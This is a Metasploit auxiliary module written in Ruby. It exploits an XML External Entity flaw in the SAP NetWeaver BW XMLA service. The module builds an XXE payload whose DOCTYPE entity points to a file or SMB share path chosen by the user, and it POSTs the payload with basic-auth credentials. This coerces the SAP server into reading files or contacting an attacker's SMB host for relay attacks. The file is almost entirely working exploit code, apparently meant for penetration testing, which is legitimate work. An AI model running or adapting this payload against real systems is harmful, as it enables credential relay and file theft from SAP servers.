##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy.
#
# The following guys from ERP-SCAN deserve credit for their contributions -
# Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry Chastukhin and
# Dmitry Evdokimov.
#
# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis
# who have Beta tested the modules and provided excellent feedback. Some people
# just seem to enjoy hacking SAP :)
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name' => 'SAP /sap/bw/xml/soap/xmla XMLA service (XML DOCTYPE) SMB relay',
			'Description' => %q{
				This module exploits the SAP NetWeaver BW XML External Entity vulnerability.
				An XML External Entities (XXE) issue exists within the XMLA service (XML DOCTYPE) function.
				The XXE vulnerability in SAP BW can lead to arbitary file reading or an SMBRelay attack.
				SAP Note 1597066 / DSECRG-12-033.
				},
			'References' => [['URL','http://erpscan.com/advisories/dsecrg-12-033-sap-basis-6-407-02-xml-external-entity/']],
			'Author' => ['nmonkee'],
			'License' => MSF_LICENSE
			)

		register_options([
			OptString.new('CLIENT', [true, 'SAP client', nil]),
			OptString.new('USER', [true, 'Username', nil]),
			OptString.new('PASS', [true, 'Password', nil]),
			OptString.new('PATH',[true,'File path (e.g. \\xx.xx.xx.xx\share)',nil])
			], self.class)
	end

	def run_host(ip)
		data = '<?xml version="1.0" encoding="utf-8" ?>'
		data = '<!DOCTYPE root ['
		data << '<!ENTITY foo SYSTEM "' + datastore['PATH'] + '">'
		data << ']>'
		data << '<in>&foo;</in>'
		user_pass = Rex::Text.encode_base64(datastore['USER'] + ":" + datastore['PASS'])
		begin
			print_status("[SAP] #{ip}:#{rport} - sending request for #{datastore['PATH']}")
			res = send_request_raw({
				'uri' => '/sap/bw/xml/soap/xmla?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
				'method' => 'POST',
				'data' => data,
				'headers' =>{
					'Content-Length' => data.size.to_s,
					'Cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
					'Authorization' => 'Basic ' + user_pass,
					'Content-Type' => 'text/xml; charset=UTF-8',}
					}, 45)
			if res
				vprint_error("[SAP] #{rhost}:#{rport} - Error code: " + res.code.to_s)
				vprint_error("[SAP] #{rhost}:#{rport} - Error title: " + res.message.to_s)
				vprint_error("[SAP] #{rhost}:#{rport} - Error message: " + res.body.to_s)
			end
			rescue ::Rex::ConnectionError
				print_error("#{rhost}:#{rport} - Unable to connect")
				return
			end
		end
	end
